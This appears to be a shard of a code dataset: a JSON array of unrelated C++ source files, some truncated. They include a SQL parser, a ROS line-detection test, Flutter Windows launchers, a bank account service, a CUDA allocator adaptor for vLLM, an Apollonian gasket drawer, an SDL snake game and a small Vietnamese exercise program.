value);\n        }\n\n        unique_ptr<GroupByNode> parseGroupBy() {\n            auto groupBy = make_unique<GroupByNode>();\n            do {\n                groupBy->columns.push_back(parseExpression());\n            }while (match(\",\"));\n            return groupBy;\n        }\n        unique_ptr<OrderByNode> parseOrderBy() {\n            auto orderBy = make_unique<OrderByNode>();\n            do {\n                OrderByNode::OrderElement element;\n                element.expression = parseExpression();\n                element.direction = match(\"DESC\") ? OrderDirection::DESC : OrderDirection::ASC;\n                orderBy->elements.push_back(move(element));\n            }while (match(\",\"));\n            return orderBy;\n        }\n\n\n};\n\nint main() {\n    vector<string> tokens = {\n        \"SELECT\", \"name\", \",\", \"age\", \"FROM\", \"students\", \"WHERE\", \"age\", \">\", \"18\",\n        \"GROUP\", \"BY\", \"class\", \"ORDER\", \"BY\", \"age\", \"DESC\"\n    };\n\n    try {\n        Parser parser(tokens);\n        auto fetchNode = parser.parseSelect();\n        cout << \"success!\" << endl;\n    } catch (const exception& e) {\n        cerr << \"Error: \" << e.what() << endl;\n    }\n\n    return 0;\n}",
    "/** MIT License\nCopyright (c) 2017 Sudarshan Raghunathan\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\nWHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\nCONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*\n*\n*@copyright Copyright 2017 Sudarshan Raghunathan\n*@file test_detect.cpp\n*@author Sudarshan Raghunathan\n*@brief  Unit Test for all the functions in the detection class\n*/\n\n#include <cv_bridge/cv_bridge.h>\n#include <gtest/gtest.h>\n#include <opencv2/highgui/highgui.hpp>\n#include \"ros/ros.h\"\n#include \"opencv2/opencv.hpp\"\n#include \"linedetect.hpp\"\n#include \"riki_line_follower/pos.h\"\n\n/**\n*@brief Testing if detection works accurately and publishes left accurately\n*@return int dir which is the direction to move in\n*/\nint turn_left() {\n    ros::NodeHandle n;\n    LineDetect det;\n    cv::String im_path1 = \"./test_images/left_turn.png\";\n    det.img = cv::imread(im_path1);\n\n    if (!det.img.empty()) {\n        det.img_filt = det.Gauss(det.img);\n        det.dir = det.colorthresh(det.img_filt);\n        return det.dir;\n    }\n}\n/**\n*@brief Testing if detection works accurately and publishes straight accurately\n*@return int dir which is the direction to move in\n*/\nint drive_straight() {\n    ros::NodeHandle n;\n    LineDetect det;\n    cv::String im_path = \"./test_images/straight.png\";\n    det.img = cv::imread(im_path);\n    if (!det.img.empty()) {\n        det.img_filt = det.Gauss(det.img);\n        det.dir = det.colorthresh(det.img_filt);\n        return det.dir;\n    }\n}\n/**\n*@brief Testing if detection works accurately and publishes right accurately\n*@return int dir which is the direction to move in\n*/\nint turn_right() {\n    ros::NodeHandle n;\n    LineDetect det;\n    cv::String im_path2 = \"./test_images/right_turn.png\";\n    det.img = cv::imread(im_path2);\n\n    if (!det.img.empty()) {\n        det.img_filt = det.Gauss(det.img);\n        det.dir = det.colorthresh(det.img_filt);\n        return det.dir;\n    }\n}\n\n/**\n*@brief Testing if detection works accurately and publishes stop accurately\n*@return int dir which is the direction to move in\n*/\nint stop() {\n    ros::NodeHandle n;\n    LineDetect det;\n    cv::String im_path3 = \"./test_images/stop.png\";\n    det.img = cv::imread(im_path3);\n\n    if (!det.img.empty()) {\n        det.img_filt = det.Gauss(det.img);\n        det.dir = det.colorthresh(det.img_filt);\n        return det.dir;\n    }\n}\n/**\n*@brief Testing if gaussian filtering functions properly\n*@return bool to test if function worked well\n*/\nbool gauss() {\n    ros::NodeHandle n;\n    LineDetect det;\n    cv::String im_path3 = \"./test_images/stop.png\";\n    det.img = cv::imread(im_path3);\n    cv::Size im_size = det.img.size();\n    det.img_filt = det.Gauss(det.img);\n    cv::Size imfilt_size = det.img_filt.size();\n    if (im_size == imfilt_size)\n        return true;\n}\n\n/**\n*@brief Testing if direction published is straight \n*/\n\nTEST(TestDirections, Teststraight) {\n    int direction = drive_straight();\n    EXPECT_EQ(1, direction);\n}\n\n/**\n*@brief Testing if direction published is left\n*/\n\nTEST(TestDirections, Testleft) {\n    int direction = turn_left();\n    EXPECT_EQ(0, direction);\n}\n\n/**\n*@brief Testing if direction published is right \n*/\n\nTEST(TestDirections, Testright ) {\n    int direction = turn_right();\n    EXPECT_EQ(2, direction);\n}\n\n/**\n*@brief Testing if search command is published \n*/\n\nTEST(TestDirections, Testsearch ) {\n    int direction = stop();\n    EXPECT_EQ(3, direction);\n}\n\n/**\n*@brief Testing if Gaussian filter is applied to image properly \n*/\n\nTEST(TestDetFunc , TestGauss) {\n    EXPECT_EQ(true , gauss());\n}\n/**\n *@brief Function to run all the tests for the detection node\n *@param argc is the number of arguments of the main function\n *@param argv is the array of arugments\n *@return result of the tests\n */\nint main(int argc, char **argv) {\n    ros::init(argc, argv, \"test_detection\");\n    testing::InitGoogleTest(&argc, argv);\n    return RUN_ALL_TESTS();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"favorite_places_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"accountService.h\"\n#include <iostream>\n#include \"../services/hashUtils.h\"\n#include <vector>\n#include \"../models/transaction.h\"\n#include <iomanip>\n#include <sstream>\n\n// ------------------ M\u00c9TODO PARA FORMATA\u00c7\u00c3O DE DATA ------------------\nstd::string AccountService::formatDate(const std::string& rawDate) {\n    struct tm tm = {};\n    std::istringstream ss(rawDate);\n    ss >> std::get_time(&tm, \"%Y-%m-%d %H:%M:%S\");\n    std::ostringstream formattedDate;\n    formattedDate << std::put_time(&tm, \"%d/%m/%Y %H:%M:%S\");\n    return formattedDate.str();\n}\n\n// ------------------ CONSTRUTOR DA CLASSE ------------------\nAccountService::AccountService() : dbConnection(std::getenv(\"DB_CONN_INFO\")) {\n    if (!std::getenv(\"DB_CONN_INFO\")) {\n        std::cerr << \"Error: DB_CONN_INFO environment variable is not set.\" << std::endl;\n        exit(1);\n    }\n}\n\n// ------------------ CRIA\u00c7\u00c3O DE CONTA ------------------\nbool AccountService::createAccount(const std::string& holder, const std::string& cpf, const std::string& hashedPassword, double initialBalance) {\n    PGresult* result = dbConnection.createAccount(holder, cpf, hashedPassword, initialBalance);\n    if (result) {\n        std::cout << \"Account created successfully: \" << holder << \" (CPF: \" << cpf << \")\" << std::endl;\n        PQclear(result);\n        return true;\n    }\n    return false;\n}\n\n// ------------------ VALIDA\u00c7\u00c3O DE LOGIN ------------------\nbool AccountService::validateLogin(const std::string& cpf, const std::string& password) {\n    PGresult* result = dbConnection.findAccountByCpf(cpf);\n    if (result && PQntuples(result) > 0) {\n        std::string storedHash = PQgetvalue(result, 0, 3);\n        PQclear(result);\n        return validatePassword(password, storedHash);\n    }\n    PQclear(result);\n    return false;\n}\n\n// ------------------ BUSCAR CONTA PELO CPF ------------------\nAccount* AccountService::findAccountByCpf(const std::string& cpf) {\n    PGresult* result = dbConnection.findAccountByCpf(cpf);\n    if (result && PQntuples(result) > 0) {\n        int id = std::stoi(PQgetvalue(result, 0, 0));  \n        std::string holder = PQgetvalue(result, 0, 1); \n        std::string cpfStored = PQgetvalue(result, 0, 2);  \n        std::string passwordHash = PQgetvalue(result, 0, 3);\n        double balance = std::stod(PQgetvalue(result, 0, 4));\n\n        PQclear(result);\n        return new Account(id, holder, cpfStored, balance);\n    }\n    PQclear(result);\n    return nullptr;\n}\n\n// ------------------ TRANSFER\u00caNCIA ENTRE CONTAS ------------------\nbool AccountService::transfer(const std::string& fromCpf, const std::string& toCpf, double amount) {\n    Account* fromAccount = findAccountByCpf(fromCpf);\n    Account* toAccount = findAccountByCpf(toCpf);\n\n    if (!fromAccount || !toAccount || fromAccount->getBalance() < amount) {\n        std::cerr << \"Transfer failed: Invalid accounts or insufficient balance.\" << std::endl;\n        return false;\n    }\n\n    PGresult* resBegin = dbConnection.executeQuery(\"BEGIN;\");\n    if (!resBegin) {\n        std::cerr << \"Error starting transaction!\" << std::endl;\n        return false;\n    }\n    PQclear(resBegin);\n\n    PGresult* resFrom = dbConnection.updateBalance(fromCpf, fromAccount->getBalance() - amount);\n    PGresult* resTo = dbConnection.updateBalance(toCpf, toAccount->getBalance() + amount);\n\n    if (!resFrom || !resTo) {\n        std::cerr << \"Error updating balances! Rolling back transaction.\" << std::endl;\n        dbConnection.executeQuery(\"ROLLBACK;\");\n        return false;\n    }\n\n    PQclear(resFrom);\n    PQclear(resTo);\n\n    PGresult* resOut = dbConnection.insertTransaction(\"Transfer Out\", amount, fromAccount->getId(), fromCpf, toCpf);\n    PGresult* resIn = dbConnection.insertTransaction(\"Transfer In\", amount, toAccount->getId(), fromCpf, toCpf);\n\n    if (!resOut || !resIn) {\n        std::cerr << \"Error inserting transactions! Rolling back transaction.\" << std::endl;\n        dbConnection.executeQuery(\"ROLLBACK;\");\n        return false;\n    }\n\n    PQclear(resOut);\n    PQclear(resIn);\n\n    PGresult* resCommit = dbConnection.executeQuery(\"COMMIT;\");\n    if (!resCommit) {\n        std::cerr << \"Error committing transaction!\" << std::endl;\n        return false;\n    }\n    PQclear(resCommit);\n\n    std::cout << \"Transfer of $\" << amount << \" from \" << fromCpf << \" to \" << toCpf << \" was successful!\" << std::endl;\n    return true;\n}\n\n// ------------------ DEP\u00d3SITO ------------------\nbool AccountService::deposit(const std::string& cpf, double amount) {\n    Account* account = findAccountByCpf(cpf);\n    if (!account || amount <= 0) {\n        std::cerr << \"Invalid deposit operation.\" << std::endl;\n        return false;\n    }\n\n    PGresult* res = dbConnection.updateBalance(cpf, account->getBalance() + amount);\n    if (!res) {\n        return false;\n    }\n    PQclear(res);\n\n    dbConnection.insertTransaction(\"Deposit\", amount, account->getId());\n    std::cout << \"Deposit of $\" << amount << \" to CPF: \" << cpf << \" was successful!\" << std::endl;\n    ret",
    "// file: vllm_allocator_adaptor_c.cpp\n//\n// An adaptor to pass Python function to PyTorch's pluggable allocator.\n// Important: allocation size, CUdeviceptr and CUmemGenericAllocationHandle* need to be unsigned long long\n\n#define PY_SSIZE_T_CLEAN\n#include <Python.h>\n\n#include <sys/types.h>\n#include <cuda_runtime_api.h>\n#include <iostream>\n#include <cuda.h>\n\n#define CUDA_CHECK(condition) \\\n    do { \\\n        CUresult error = condition; \\\n        if (error != 0) { \\\n            char* error_string; \\\n            cuGetErrorString(error, (const char**)&error_string); \\\n            std::cerr << \"[vllm_allocator_adaptor_c] CUDA Error: \" << error_string << \" at \" << __FILE__ << \":\" << __LINE__ << std::endl; \\\n        } \\\n    } while (0)\n\n// Global references to Python callables\n// NOTE: this is borrowed reference, so we don't need to DECREF them.\nstatic PyObject* g_python_malloc_callback = nullptr;\nstatic PyObject* g_python_free_callback   = nullptr;\n\nextern \"C\" {\n\nvoid ensure_context(unsigned long long device)\n{\n    CUcontext pctx;\n    CUDA_CHECK(cuCtxGetCurrent(&pctx));\n    if (!pctx) {\n        // Ensure device context.\n        CUDA_CHECK(cuDevicePrimaryCtxRetain(&pctx, device));\n        CUDA_CHECK(cuCtxSetCurrent(pctx));\n    }\n}\n\n// ---------------------------------------------------------------------------\n// Our exported C functions that call Python:\n\nvoid create_and_map(unsigned long long device, ssize_t size, CUdeviceptr d_mem, CUmemGenericAllocationHandle* p_memHandle)\n{\n    ensure_context(device);\n    // Define memory allocation properties\n    CUmemAllocationProp prop = {};\n    prop.type = CU_MEM_ALLOCATION_TYPE_PINNED;\n    prop.location.type = CU_MEM_LOCATION_TYPE_DEVICE;\n    prop.location.id = device;\n    prop.allocFlags.compressionType = CU_MEM_ALLOCATION_COMP_NONE;\n\n    // Allocate memory using cuMemCreate\n    CUDA_CHECK(cuMemCreate(p_memHandle, size, &prop, 0));\n    CUDA_CHECK(cuMemMap(d_mem, size, 0, *p_memHandle, 0));\n\n    CUmemAccessDesc accessDesc = {};\n    accessDesc.location.type = CU_MEM_LOCATION_TYPE_DEVICE;\n    accessDesc.location.id = device;\n    accessDesc.flags = CU_MEM_ACCESS_FLAGS_PROT_READWRITE;\n\n    CUDA_CHECK(cuMemSetAccess(d_mem, size, &accessDesc, 1));\n    // std::cout << \"[vllm_allocator_adaptor_c] create_and_map: device=\" << device << \", size=\" << size << \", d_mem=\" << d_mem << \", p_memHandle=\" << p_memHandle << std::endl;\n}\n\nvoid unmap_and_release(unsigned long long device, ssize_t size, CUdeviceptr d_mem, CUmemGenericAllocationHandle* p_memHandle)\n{\n    // std::cout << \"[vllm_allocator_adaptor_c] unmap_and_release: device=\" << device << \", size=\" << size << \", d_mem=\" << d_mem << \", p_memHandle=\" << p_memHandle << std::endl;\n    ensure_context(device);\n    CUDA_CHECK(cuMemUnmap(d_mem, size));\n    CUDA_CHECK(cuMemRelease(*p_memHandle));\n}\n\nPyObject* create_tuple_from_c_integers(unsigned long long a, unsigned long long b, unsigned long long c, unsigned long long d) {\n    // Create a new tuple of size 4\n    PyObject *tuple = PyTuple_New(4);\n    if (!tuple) {\n        return NULL; // Return NULL on failure\n    }\n\n    // Convert integers to Python objects and set them in the tuple\n    PyTuple_SetItem(tuple, 0, PyLong_FromLong(a)); // Steals reference to the PyLong\n    PyTuple_SetItem(tuple, 1, PyLong_FromLong(b));\n    PyTuple_SetItem(tuple, 2, PyLong_FromUnsignedLongLong(c));\n    PyTuple_SetItem(tuple, 3, PyLong_FromUnsignedLongLong(d));\n\n    // Note: PyTuple_SetItem \"steals\" a reference to each object,\n    // so we do not need to Py_DECREF the PyLong objects explicitly.\n\n    return tuple; // Return the created tuple\n}\n\nvoid* my_malloc(ssize_t size, int device, cudaStream_t stream) \n{\n    ensure_context(device);\n\n    // first allocation, align the size, and reserve an address, and also allocate a CUmemGenericAllocationHandle\n\n    // Define memory allocation properties\n    CUmemAllocationProp prop = {};\n    prop.type = CU_MEM_ALLOCATION_TYPE_PINNED;\n    prop.location.type = CU_MEM_LOCATION_TYPE_DEVICE;\n    prop.location.id = device;\n    prop.allocFlags.compressionType = CU_MEM_ALLOCATION_COMP_NONE;\n\n    // Check if the allocation is supported\n    size_t granularity;\n    CUDA_CHECK(cuMemGetAllocationGranularity(&granularity, &prop, CU_MEM_ALLOC_GRANULARITY_MINIMUM));\n\n    size_t alignedSize = ((size + granularity - 1) / granularity) * granularity;\n\n    CUdeviceptr d_mem;\n    CUDA_CHECK(cuMemAddressReserve(&d_mem, alignedSize, 0, 0, 0));\n\n    // allocate the CUmemGenericAllocationHandle\n    CUmemGenericAllocationHandle* p_memHandle = (CUmemGenericAllocationHandle*)malloc(sizeof(CUmemGenericAllocationHandle));\n\n    if (!g_python_malloc_callback) {\n        std::cerr << \"[vllm_allocator_adaptor_c] ERROR: g_python_malloc_callback not set.\\n\";\n        return nullptr;\n    }\n\n    // Acquire GIL (not in stable ABI officially, but often works)\n    PyGILState_STATE gstate = PyGILState_Ensure();\n\n    PyObject* arg_tuple = create_tuple_from_c_integers(device, alignedSize, (unsigned long long)d_mem, (",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ulearning\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\n#include \"graphics2.h\"\n#include \"cerc.cpp\"\nusing namespace std;\nint const lenmax=750;\ndouble len_ecran=500;///valoarea standard\ndouble lenmin=1.0;\nint const global_nrcolmax=77;\nint nrcolmax=7;\nint delay_value=0;\nbool error=false;\nint colorvector[global_nrcolmax];\nvoid make_colorvector(bool mode)\n{\n    if(mode==1)///culori standard\n    {\n        colorvector[0]=15;///alb\n        colorvector[1]=1;///albastru inchis\n        colorvector[2]=14;///galben\n        colorvector[3]=2;///verde\n        colorvector[4]=5;///roz\n        colorvector[5]=3;///albastru deschis\n        colorvector[6]=4;///rosu\n        return;\n    }\n    cout<<\"Scrie ce culori vrei incluse si 0 cand vrei sa te opresti\\n\";\n    cout<<\"Culorile disponibile sunt:\\nALBASTRU INCHIS<-1\\nVERDE<-2\\nALBASTRU DESCHIS<-3\\nROSU<-4\\nROZ<-5\\nGALBEN<-14\\nALB<-15\\n\";\n    int index=0;\n    int input_color;\n    while(cin>>input_color)\n    {\n\n        if(input_color==0)\n        {\n            break;\n        }\n        if(input_color<0 or input_color>15 or (input_color>5 and input_color<14))\n        {\n            cout<<\"culoare gresita\";\n            error=true;\n            return;\n        }\n        if(index+1==global_nrcolmax)\n        {\n            cout<<\"prea multe culori\";\n            error=true;\n            return;\n        }\n        colorvector[index++]=input_color;\n    }\n    if(index==0)\n    {\n        cout<<\"Prea putine culori\";\n        error=true;\n        return;\n    }\n    nrcolmax=index;\n\n}\n\nvector<cerc> toate_cercurile;\n\ncerc c_principal,c_aux1,c_aux2;\n\nvector<cerc> exemplu_c1 = {cerc(150,250,100), cerc(250,200,150), cerc(250,142.82,92.820323)   };\nvector<cerc> exemplu_c2 = {cerc(350,250,100), cerc(250,400,50),  cerc(157.18,303.59,92.820323)};\n\n\n\nvoid initializare_exemplu(int exemplu)\n{\n    c_aux1=exemplu_c1[exemplu-1];\n    c_aux2=exemplu_c2[exemplu-1];\n    if(c_aux1.raza<lenmin or c_aux2.raza<lenmin)\n    {\n        c_principal.deseneaza();\n        error=true;\n    }\n    return;\n}\nvoid initializare_consola()\n{\n    cout<<\"\\n\\nScrie mai intai lungimea ecranului(500<=len_ecran<=750): \";\n    cin>>len_ecran;\n    if(len_ecran<500 or len_ecran>750)\n    {\n        cout<<\"\\nlungimea ecranului nu respecta conditiile\";\n        error=true;\n        return ;\n    }\n    c_principal=cerc(len_ecran/2,len_ecran/2,len_ecran/2-50);\n    c_principal.curbura*=-1;\n\n    cout<<\"\\nTrebuie introduse coordonatele a 2 cercuri tangente intre ele care sunt de asemenea tangente la cercul principal\\nde coordonate x=\"<<len_ecran/2<<\" ,y=\"<<len_ecran/2<<\" ,raza=\"<<len_ecran/2-50.0<<\"\\n\";\n    cerc input1,input2;\n    while(true)\n    {\n        cout<<\"Pentru primul cerc trebuie introduse coordonatele x, y si raza: \";\n        cin>>input1.x>>input1.y>>input1.raza;\n        input1.curbura=1.0/input1.raza;\n        cout<<\"\\nPentru al doilea cerc trebuie introduse coordonatele x, y si raza: \";\n        cin>>input2.x>>input2.y>>input2.raza;\n        input2.curbura=1.0/input2.raza;\n        if(input1.raza>=lenmin and input2.raza>=lenmin and\n            input1.este_egal(input2)==false and\n            input1.este_tangent(input2) and input1.este_tangent(c_principal) and input2.este_tangent(c_principal) and\n            input1.apartine(c_principal) and input2.apartine(c_principal))\n        {\n            break;\n        }\n        if(input1.raza<lenmin or input2.raza<lenmin)\n        {\n            cout<<\"\\nraza nu poate fi mai mica decat raza minima aleasa la inceput, incearca din nou!\\n\";\n        }\n        if(input1.este_egal(input2)==true)\n        {\n            cout<<\"\\ncele 2 cercuri sunt (aproximativ) egale, incearca din nou!\\n\";\n        }\n        else if(input1.este_tangent(input2)==false or input1.este_tangent(c_principal)==false or input2.este_tangent(c_principal)==false)\n        {\n            cout<<\"\\ncercurile nu sunt tangente, incearca din nou!\\n\";\n        }\n        else if(input1.apartine(c_principal)==false or input2.apartine(c_principal)==false)\n        {\n            cout<<\"\\ncercurile nu sunt incluse in cel principal, incearca din nou!\\n\";\n        }\n    }\n    c_aux1=cerc(input1.x,input1.y,input1.raza);\n    c_aux2=cerc(input2.x,input2.y,input2.raza);\n\n    return;\n}\nvoid citire()\n{\n    cout<<\"Apollonian gasket\\n\";\n    cout<<\"\\n\\nSeteaza timpul de pauza dintre crearea a doua cercuri(se recomanda un numar mai mic decat 1000): \";\n    cin>>delay_value;\n    if(delay_value<0)\n    {\n        cout<<\"\\nNu poate fi un numar negativ\";\n        error=true;\n        return;\n    }\n    cout<<\"\\n\\nCulori standard?(1-da, 0-vreau sa le aleg individual): \";\n    int inputB;\n    cin>>inputB;\n    if(inputB<0 or inputB>1)\n    {\n        cout<<\"\\n\\ninput gresit\";\n        error=true;\n        return;\n    }\n    make_colorvector(inputB);\n    if(error==true)\n    {\n        return;\n    }\n    cout<<\"\\n\\nSelecteaza configuratia initiala(0-> vreau sa introduc cercurile manual; i pentru exemplele predefinite, cu i intre 1 si \"<<exemplu_c1.size()<<\")\\n\";\n    int input_cerc;\n    cin>>input_cerc;\n    if(input_cerc>=1 and input_cerc<=",
    "\r\n#include <SDL.h>\r\n#include <SDL_video.h>\r\n#include <SDL_image.h>\r\n#include <SDL_ttf.h>\r\n#include <cstdlib>\r\n#include <iostream>\r\n#include <ctime>\r\n#include <fstream>\r\n#include <deque>\r\n\r\nusing namespace std;\r\n\r\nenum Direction\r\n{\r\n    DOWN = 0,\r\n    LEFT = 1,\r\n    RIGHT = 2,\r\n    UP = 3\r\n};\r\n//a class to build timer, use it for FPS, source code from lazyfoo\r\nclass LTimer\r\n{\r\npublic:\r\n    //Initializes variables\r\n    LTimer();\r\n\r\n    //The various clock actions\r\n    void start();\r\n    void stop();\r\n    void pause();\r\n    void unpause();\r\n\r\n    //Gets the timer's time\r\n    Uint32 getTicks();\r\n\r\n    //Checks the status of the timer\r\n    bool isStarted();\r\n    bool isPaused();\r\n\r\nprivate:\r\n    //The clock time when the timer started\r\n    Uint32 mStartTicks;\r\n\r\n    //The ticks stored when the timer was paused\r\n    Uint32 mPausedTicks;\r\n\r\n    //The timer status\r\n    bool mPaused;\r\n    bool mStarted;\r\n};\r\n\r\n//A class use to render text\r\n//based on lazyFoo, and i modified it follow a n instruction video on youtube\r\nclass TextObject\r\n{\r\npublic:\r\n    //Initializes variables\r\n    TextObject();\r\n    //Deallocates memory\r\n    ~TextObject();\r\n\r\n    enum textColor\r\n    {\r\n        RED_TEXT = 0,\r\n        WHITE_TEXT = 1,\r\n        BLACK_TEXT = 2\r\n    };\r\n\r\n    //Creates image from font string\r\n    bool loadFromRenderedText(TTF_Font* font, SDL_Renderer* renderer);\r\n    void free();\r\n\r\n    //Set color modulation\r\n    void setColor(Uint8 red, Uint8 green, Uint8 blue);\r\n    void setColor(int type);\r\n\r\n    //Renders texture at given point\r\n    void renderText(SDL_Renderer* renderer, int x, int y,\r\n            SDL_Rect* clip = NULL,\r\n            double angle = 0.0,\r\n            SDL_Point* center = NULL,\r\n            SDL_RendererFlip flip = SDL_FLIP_NONE);\r\n\r\n    void setText(const string& text)\r\n    {\r\n        stringVal = text;\r\n    }\r\n\r\n    //Gets image dimensions\r\n    int getWidth();\r\n    int getHeight();\r\n\r\nprivate:\r\n    //The actual hardware texture\r\n    SDL_Texture* mTexture;\r\n    SDL_Color textColor;\r\n\r\n    string stringVal;\r\n\r\n    //Image dimensions\r\n    int mWidth;\r\n    int mHeight;\r\n};\r\n\r\nstruct Color\r\n{\r\n    int r;\r\n    int g;\r\n    int b;\r\n};\r\n\r\nconst int WIDTH = 640;\r\nconst int HEIGHT = 480;\r\nconst int VIS = 255; //visible constant use for render\r\nconst int HALF_WIDTH = WIDTH / 2;\r\nconst int HALF_HEIGHT = HEIGHT / 2;\r\nconst Color WHITE{255, 255, 255}; //some color use for constant\r\nconst Color BLACK{0, 0, 0};\r\nconst Color GREEN{0, 255, 0};\r\nconst Color BLUE{0, 0, 255};\r\nconst Color YELLOW{255, 255, 0};\r\nconst Color RED{255, 0, 0};\r\nconst Color LIGHT_PINK{255, 192, 203};\r\nconst int SCREEN_FPS = 30;\r\nconst int SCREEN_TICKS_PER_FRAME = 1000 / SCREEN_FPS;\r\nSDL_Window* window = NULL;\r\nSDL_Renderer* renderer = NULL;\r\nTTF_Font* font = NULL;\r\n\r\nbool checkCollision(SDL_Rect a, SDL_Rect b);\r\nbool snakeDie(SDL_Rect a, const deque<SDL_Rect>& snakeBody);\r\nbool checkValid(SDL_Rect& a, const deque<SDL_Rect>& snakeBody, const SDL_Rect snakeHead);\r\nbool init();\r\n\r\nvoid setColor(SDL_Renderer* &renderer, Color color);\r\nvoid spawnFood(SDL_Rect& a, const deque<SDL_Rect>& snakeBody, const SDL_Rect snakeHead);\r\nvoid drawBlack(SDL_Renderer* &renderer, SDL_Rect snakeHead);\r\n\r\nint foodValue(int& value);\r\n\r\nint main(int argc, char* args[])\r\n{\r\n    TextObject timeText;\r\n    TextObject loseText;\r\n    TextObject instruction;\r\n    srand(time(0));\r\n\r\n    ofstream fout;\r\n    ifstream fin;\r\n\r\n    if (!init())\r\n    {\r\n        cout << \"Cannot init!\";\r\n    }\r\n    else\r\n    {\r\n        SDL_Event e;\r\n        bool run = true; // main flag\r\n        //fill the whole screen with black\r\n        setColor(renderer, BLACK);\r\n        SDL_RenderClear(renderer);\r\n\r\n        while (run)\r\n        {\r\n            int dir = -1; //make sure the snake doesn't run until the player press arrow key or AWSD key\r\n            int size = 1; //size will be one, (the head)\r\n            int value;\r\n            int foodCount = 0;\r\n\r\n            bool snakeAlive = false; //flag for the game loop\r\n            Uint32 startTime;\r\n\r\n            LTimer capTimer;\r\n\r\n            //for some reason when I use vector, my code build successful but run fail, so i use deque\r\n            deque<SDL_Rect> snakeBody;\r\n\r\n            SDL_Rect food{rand() % (WIDTH - 10), rand() % (HEIGHT - 10), 10, 10};\r\n            SDL_Rect snakeHead{HALF_WIDTH - 100, HALF_HEIGHT - 100, 10, 10};\r\n            //a temporary rect with size 10x10, outside the screen, use for the snake body\r\n            SDL_Rect temp{-10, -10, 10, 10};\r\n\r\n            font = TTF_OpenFont(\"lazy.ttf\", 15);\r\n            instruction.setText(\"USE WASD OR ARROW KEY TO PLAY! YOUR SNAKE HEAD IS THE WHITE SQUARE\");\r\n            instruction.setColor(TextObject::WHITE_TEXT);\r\n            instruction.loadFromRenderedText(font, renderer);\r\n            instruction.renderText(renderer, (WIDTH - instruction.getWidth()) / 2, 50);\r\n\r\n            font = TTF_OpenFont(\"lazy.ttf\", 30);\r\n            instruction.setText(\"PRESS ANY KEY TO START!\");\r\n            instruction",
    "// bai15_tinhsothoc.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <cmath>\nusing namespace std;\nint main()\n{\n    {\n        cout << \"TINH SO THOC TREN BAN CO VUA\\n\";\n        int o;\n        int sothoc = 0;\n        cout << \"Nhap so o tren ban co: \"; cin >> o;\n        for (int i = 0; i < o; i++)\n        {\n            sothoc = sothoc + pow(2, i);\n        }\n        cout << \"so thoc la: \" << sothoc;\n    }\n}\n\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
